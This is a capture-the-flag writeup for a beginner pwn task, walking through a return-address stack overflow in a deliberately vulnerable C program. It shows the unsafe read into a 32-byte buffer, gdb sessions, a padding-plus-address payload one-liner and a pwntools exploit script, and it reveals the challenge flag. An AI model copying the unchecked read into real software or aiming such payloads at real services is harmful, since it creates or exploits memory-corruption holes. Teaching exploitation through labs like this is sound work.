# Writeup [Introduction to Pwntions](README.md)


## Task Description
**Points: 100**

**Author: maritio_o**

**Difficulty: n00b/easy**

**Category: pwn**

---

_"It's still magic even if you know how it's all done."_
    
—Professor maritio_o' closing of the class

Now, Pwnie holds a deeper secret than the other pwntions could
get to. Using a special mixture in your new pwntion, you may get
this secret as well. Remember to use a hint of **return address** and
geto to the **function** in your pwntion, and you will get it right. 

```
nc pwntion3.tghack.no 1063
```

<details><summary>Tip</summary>

Read the Stack Overflow pt. 3 section in the
Introduction to Pwntions tutorial to learn about this
type of stack overflow problem.
</details>

---

## Writeup
As mentioned in a previous writeup, a nice approach is to follow these steps:
1. Check the remote connection 
2. Pwn given binary locally on your machine
3. Send the exploit script to remote connection

### 1. Check the remote connection
Alright then, lets check out what the executable does:
```
$ nc pwntions3.tghack.no 1063
▪   ▐ ▄ ▄▄▄▄▄▄▄▄        ·▄▄▄▄  ▄• ▄▌ ▄▄· ▄▄▄▄▄▪         ▐ ▄     ▄▄▄▄▄
██ •█▌▐█•██  ▀▄ █·▪     ██▪ ██ █▪██▌▐█ ▌▪•██  ██ ▪     •█▌▐█    •██  ▪
▐█·▐█▐▐▌ ▐█.▪▐▀▀▄  ▄█▀▄ ▐█· ▐█▌█▌▐█▌██ ▄▄ ▐█.▪▐█· ▄█▀▄ ▐█▐▐▌     ▐█.▪ ▄█▀▄
▐█▌██▐█▌ ▐█▌·▐█•█▌▐█▌.▐▌██. ██ ▐█▄█▌▐███▌ ▐█▌·▐█▌▐█▌.▐▌██▐█▌     ▐█▌·▐█▌.▐▌
▀▀▀▀▀ █▪ ▀▀▀ .▀  ▀ ▀█▄▀▪▀▀▀▀▀•  ▀▀▀ ·▀▀▀  ▀▀▀ ▀▀▀ ▀█▄▀▪▀▀ █▪     ▀▀▀  ▀█▄▀▪
 ▄▄▄·▄▄▌ ▐ ▄▌ ▐ ▄ ▄▄▄▄▄▪         ▐ ▄ .▄▄ ·      ▄▄· ▄▄▌   ▄▄▄· .▄▄ · .▄▄ · ▄▄
▐█ ▄███· █▌▐█•█▌▐█•██  ██ ▪     •█▌▐█▐█ ▀.     ▐█ ▌▪██•  ▐█ ▀█ ▐█ ▀. ▐█ ▀. ██▌
 ██▀·██▪▐█▐▐▌▐█▐▐▌ ▐█.▪▐█· ▄█▀▄ ▐█▐▐▌▄▀▀▀█▄    ██ ▄▄██▪  ▄█▀▀█ ▄▀▀▀█▄▄▀▀▀█▄▐█·
▐█▪·•▐█▌██▐█▌██▐█▌ ▐█▌·▐█▌▐█▌.▐▌██▐█▌▐█▄▪▐█    ▐███▌▐█▌▐▌▐█ ▪▐▌▐█▄▪▐█▐█▄▪▐█.▀
.▀    ▀▀▀▀ ▀▪▀▀ █▪ ▀▀▀ ▀▀▀ ▀█▄▀▪▀▀ █▪ ▀▀▀▀     ·▀▀▀ .▀▀▀  ▀  ▀  ▀▀▀▀  ▀▀▀▀  ▀
------------------------------ Overflow pt. 3 -------------------------------

Professor maritio_o:
> I've made a function for you, my magnificent students! Do a little brewing and show me what you are good for!

Student: Hello!
```

The executable accepts our input and simply terminates. I guess we should take
a look at the code and the binary to understand what is going on here! 

### 2. Pwn given binary locally on your machine
For every pwn-task it is a good idea to start by checking the security
mechanisms in your program. I use [gdb-peda](https://github.com/longld/peda) 
for debugging and use its tools. I open the executable file in gdb-peda by 
entering `gdb ./pwntion3` in the terminal. To find the security mechanism, 
**checksec** in gdb-peda is quite nice:
```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : disabled
```

The output above tells us that all security mechanisms are turned off. 
Usually, when all of these are turned off, the task is a normal 
_stack overflow_. In this task, that fact was provided, but this is useful 
information for other pwn tasks.

First, lets take a look the source code which is provided in the snippet 
below, and try to find the vulnerability. 

```C
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

void brew_pwntion(void)
{
	system("cat flag.txt");
}

void answer_professor(void)
{
	char pwntion[32];

	printf("\nProfessor maritio_o:\n");
	printf("> I've made a function for you, my magnificent students! Do ");
	printf("a little brewing and show me what you are good for!\n\n");
	printf("Student: ");

	read(STDIN_FILENO, pwntion, 128);
}

/* Don't mind me, I just print the banner*/
static void print_banner(void)
{
	FILE *fp;
	char *buf;
	size_t size;

	fp = fopen("banner.txt", "r");
	if (!fp) {
		perror("fopen(banner.txt)");
		exit(EXIT_FAILURE);
	}

	fseek(fp, 0, SEEK_END);
	size = ftell(fp);
	buf = calloc(1, size);
	rewind(fp);

	/* -1 to drop newline */
	if (fread(buf, size - 1, 1, fp) < 1) {
		perror("fread()");
		exit(EXIT_FAILURE);
	}

	fclose(fp);

	printf("%s\n", buf);
	free(buf);
}

int main(void) 
{
	setvbuf(stdout, NULL, _IONBF, 0);
	print_banner();
	answer_professor();

	return 0;
}
```

There are a couple of things to notice in the source code above:
* There is a functon called **main(void)**. In C programs, the main function
is always called first. Therefore, we start looking at that function. The 
main function contain four lines of code:
	* **setvbuf(stdout, NULL, _IONBF, 0);**: `stdout` is usually line-buffered,
	this means that output will only be sent (e.g. from printf) when a newline 
	is encountered. This function sets `stdout` to be unbuffered, which means 
	that we will always receive output from the binary. If we do not use this,
	the output will often fail to be sent over a network.
	* **print_banner();**: Calls a function who's only functionality is to
	read a file which contain the banner, and print its contents. 
	We will ignore this, as it does not contain anything interesting.
	* **answer_professor();**: This function is interesting, and we will
	discuss this further in the next main bullet point,
	* **return 0;**: Returning 0 means to exit the program.

* The function called **answer_professor()** has the following three parts:
	* We have a buffer called **pwntion** with room for 32 characters. 
	* The program prints four lines of text to the terminal using the function
**printf()**. Nothing magical here, just printing text.
	* We have used the **read()** function to read input data from the terminal, 
which allows the first 128 characters to be read into the program, all other 
characters will be ignored. 
* Lastly, there is a function called **brew_pwntion()** that uses the 
`system()` function to paste the terminal command `cat flag.txt`. 
Obviously (or maybe not if you haven't seen this dark magic before), 
this command pastes the content of a file called **flag.txt**. In CTF's the
flag.txt file is often used to hold the flag, so getting the contents of that 
file is the end goal of the task.

Oh wait, do you see what I see? The **brew_pwntion()** function is not 
used in the program, is it? It is not called anywhere in the C code, it is only
declared. What if we somehow manipulate the program to run this function?

Summed up, the issue is that the program will happily read and store up to 128
characters, but only has reserved space for 32 characters in the buffer called
**pwntion**. All security mechanisms are turned off as well. This kind of 
vulnerability is commonly known as the buffer overflow vulnerability. Or even 
more specific, this type of buffer overflow is a stack overflow. By looking at 
the code, we understand that we have to manipulate the program to paste the 
flag by running the function **brew_pwntion()**. We don't need 
a debugger to take advantage of this, but let's open **gdb-peda** and see what 
we can do. Debuggers makes it a lot easier to understand what is going on and 
pwn the binary. 

Now, open the executable in gdb-peda, and insert lots of A's in order to find 
out exactly where in the program it crashes. You may run the executable with 
input by entering `r <<< [your input here]` into the debugger. I use python to 
insert fifty A's into the debugger:

<details>
<summary>Checkout tip about inserting input to the program</summary>

It is common to use the capital letter `A` as input, to easily find 
it in the stack later. We may recognize the letter by its hexadecimal 
representation, `41`, in the debugger. Sometimes it comes in handy to use 
`B` as well, which has the hexadecimal representation of `42`. You should 
keep in mind that `0a` is the hex code for line break, meaning when you 
press the enter-button.
</details><br>

```
gdb-peda$ r <<< `python2 -c 'print "A"*50'`
My awesome banner!

Professor maritio_o:
> I've made a function for you, my magnificent students! Do a little brewing and show me what you are good for!

Student: 
Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
EAX: 0x33 ('3')
EBX: 0x41414141 ('AAAA')
ECX: 0xffffd090 ('A' <repeats 50 times>, "\n\377")
EDX: 0x80 
ESI: 0xf7fb3000 --> 0x1d7d6c 
EDI: 0x0 
EBP: 0x41414141 ('AAAA')
ESP: 0xffffd0c0 --> 0xff0a4141 
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0xffffd0c0 --> 0xff0a4141 
0004| 0xffffd0c4 --> 0x0 
0008| 0xffffd0c8 --> 0x0 
0012| 0xffffd0cc --> 0xf7df3e81 (<__libc_start_main+241>:	add    esp,0x10)
0016| 0xffffd0d0 --> 0xf7fb3000 --> 0x1d7d6c 
0020| 0xffffd0d4 --> 0xf7fb3000 --> 0x1d7d6c 
0024| 0xffffd0d8 --> 0x0 
0028| 0xffffd0dc --> 0xf7df3e81 (<__libc_start_main+241>:	add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()
gdb-peda$ 
```

Alright, a lot of new stuff at once here... What we see, using gdb-peda, is
the registers, code, stack, and some messages at the bottom. We focus on the 
stack and the messages on the bottom in this writeup.

In the messages on the bottom of the snippet above, we see that the program 
stopped due to 
`SIGSEGV`. That means the program stopped because of a segmentation fault, also
known as a segfault. In addition, we notice that the reason of the segfault is
that the address the program tried to return to is `0x41414141`. We know that
this is the return address, because it is the only thing that we can overwrite 
that may end up with the program exiting due to a segfault. 

By trial and failure, we find the exact padding for the return address. I 
usually add four B's at the end of my A's in order to know that I may replace 
the B's with the new return address. Having the right amount of padding, 
gdb-peda's output will look like this:

```
gdb-peda$ r <<< `python -c 'print "A" *44 + "BBBB"'`
My awesome banner!

Professor maritio_o:
> I've made a function for you, my magnificent students! Do a little brewing and show me what you are good for!

Student: 
Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
EAX: 0x31 ('1')
EBX: 0x41414141 ('AAAA')
ECX: 0xffffd0a0 ('A' <repeats 44 times>, "BBBB\n\320\377\377")
EDX: 0x80 
ESI: 0xf7fb3000 --> 0x1d7d6c 
EDI: 0x0 
EBP: 0x41414141 ('AAAA')
ESP: 0xffffd0d0 --> 0xffffd00a --> 0x83540000 
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xffffd0d0 --> 0xffffd00a --> 0x83540000 
0004| 0xffffd0d4 --> 0x0 
0008| 0xffffd0d8 --> 0x0 
0012| 0xffffd0dc --> 0xf7df3e81 (<__libc_start_main+241>:	add    esp,0x10)
0016| 0xffffd0e0 --> 0xf7fb3000 --> 0x1d7d6c 
0020| 0xffffd0e4 --> 0xf7fb3000 --> 0x1d7d6c 
0024| 0xffffd0e8 --> 0x0 
0028| 0xffffd0ec --> 0xf7df3e81 (<__libc_start_main+241>:	add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
gdb-peda$ 
```

The address the program segfaulted on is `0x42424242`. Nice! That is the B's 
we inserted in my oneline script. That means the padding is 44, as we see in the
oneliner below. 
```
gdb-peda$ r <<< `python -c 'print "A" *44 + "BBBB"'`
```

Next step is to find the address of the function `brew_pwntion()`. That is
an easy step using gdb-peda! We simply use the gdb command `disas` and add the
function name as parameter. Then we disassemble the function, and may grab the
address at the top of the function.

```
gdb-peda$ disas brew_pwntion 
Dump of assembler code for function brew_pwntion:
   0x080486e6 <+0>:	push   ebp
   0x080486e7 <+1>:	mov    ebp,esp
   0x080486e9 <+3>:	push   ebx
   0x080486ea <+4>:	sub    esp,0x4
   0x080486ed <+7>:	call   0x80488cd <__x86.get_pc_thunk.ax>
   0x080486f2 <+12>:	add    eax,0x160a
   0x080486f7 <+17>:	sub    esp,0xc
   0x080486fa <+20>:	lea    edx,[eax-0x139c]
   0x08048700 <+26>:	push   edx
   0x08048701 <+27>:	mov    ebx,eax
   0x08048703 <+29>:	call   0x8048550 <system@plt>
   0x08048708 <+34>:	add    esp,0x10
   0x0804870b <+37>:	nop
   0x0804870c <+38>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x0804870f <+41>:	leave  
   0x08048710 <+42>:	ret    
End of assembler dump.
gdb-peda$ 
```

We grab the first address, `0x080486e6`, and put it into our oneliner instead 
of the B's! First, remember the little chat we had about little endian input 
from the previous pwntions task? We need to do the same here, and end up with
the following oneliner:
```
gdb-peda$ r <<< `python -c 'print "A" *44 + "\xe6\x86\x04\x08"'`
```

Giving the following output:
```
python -c 'print "A" *44 + "\xe6\x86\x04\x08"'`
My awesome banner!

Professor maritio_o:
> I've made a function for you, my magnificent students! Do a little brewing and show me what you are good for!

Student: [New process 20889]
process 20889 is executing new program: /bin/dash
[New process 20890]
process 20890 is executing new program: /bin/cat
cat: flag.txt: No such file or directory
[Inferior 3 (process 20890) exited with code 01]
Warning: not running or target is remote
gdb-peda$ 
```

That is it! The line `process 20889 is executing new program: /bin/dash` means
that the program open a shell using **/bin/sh**. The following line 
`process 20890 is executing new program: /bin/cat` together with `cat: 
flag.txt: No such file or directory` means that the program tried to use the
terminal command **cat** to paste the contents of the file **flag.txt**. 
However, the flag was not present locally on my machine, so it says that it 
does not exist. 

I want to show you my solve script, `solve.py`, for Python as well:
```python
from pwn import *

r = process("./pwntion3")
r.recvuntil("Student:")

new_return_address = p32(0x080486e6) #0x080486e6

r.sendline("A" * 44 + new_return_address)

r.interactive()
```

We use the exact same information gained for the oneliner script, but the 
Python script using pwntools is easier to work with when the solution scripts
get a little complex. Let's run the script, and see that it returns the same
message as for the oneliner. It is trying to open the flag.txt file.

```
python solve.py     
[+] Starting local process './pwntion3': pid 21131
[*] Switching to interactive mode
 cat: flag.txt: No such file or directory
[*] Got EOF while reading in interactive
$  
```

Awesome!! Let's insert either of the solution scripts into the remote server,
and fetch the flag! 

### 3. Send the exploit script to remote connection
As mentioned before, there are two very nice ways to insert the solution script
to the remote server. We may use the same oneliner as we used locally, or
run the Python script.

Oneliner:
```
$ python -c 'print "A" * 44 + "\xe6\x86\x04\x08"' | nc pwntion3.tghack.no 1063
My awesome banner!

Professor maritio_o:
> I've made a function for you, my magnificent students! Do a little brewing and show me what you are good for!

Student: TG19{Awesome! You are now better at pwning than many CTFers!! Congratulations}
```

When using the solve script, we have to add the option of sending the input
to the remote server. In the first part of the script, I've added an if 
statement, so that we may set the variable **debug** to either True or False.
It is set to False now, so that we know we send the input to the remote server.

```python
from pwn import *

debug = False
if debug == True:
	r = process("./pwntion3")
else:
	r = remote("pwntion3.tghack.no", 1063)

r.recvuntil("Student:")

new_return_address = p32(0x080486e6) #0x080486e6

r.sendline("A" * 44 + new_return_address)

r.interactive()
```

```
$ python solve.py
[+] Opening connection to localhost on port 4444: Done
[*] Switching to interactive mode
 TG19{Awesome! You are now better at pwning than many CTFers!! Congratulations}
[*] Got EOF while reading in interactive
$  
```

Tadaa!!
